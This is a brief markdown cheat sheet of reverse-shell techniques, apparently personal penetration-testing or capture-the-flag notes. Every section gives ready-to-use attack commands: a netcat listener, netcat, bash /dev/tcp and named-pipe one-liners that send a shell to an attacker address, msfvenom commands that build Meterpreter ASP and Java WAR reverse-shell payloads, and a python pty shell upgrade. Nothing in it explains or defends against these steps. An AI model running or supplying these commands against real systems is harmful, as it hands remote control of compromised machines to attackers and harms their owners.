# Reverse shells

Attacker runs:
```
nc -nvlp <port>
```

Target runs:
```
nc -nv <ip> <port> -e <cmd>
```
or:
```
bash -i >&/dev/tcp/x.x.x.x/443 0>&1
```
OR:
```
tail -n 0 -f /tmp/1 | /bin/sh 2>&1 | nc -nv LHOST LPORT 1> /tmp/1
```


## Metasploit venom

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f asp > msfshell.asp
```

## Interactive shell upgrade

```
python3 -c 'import pty; pty.spawn("/bin/sh")'
```

## WAR

```
msfvenom -p java/shell_reverse_tcp LHOST=tun0 LPORT=443 -f war > hacketyhack.war
```
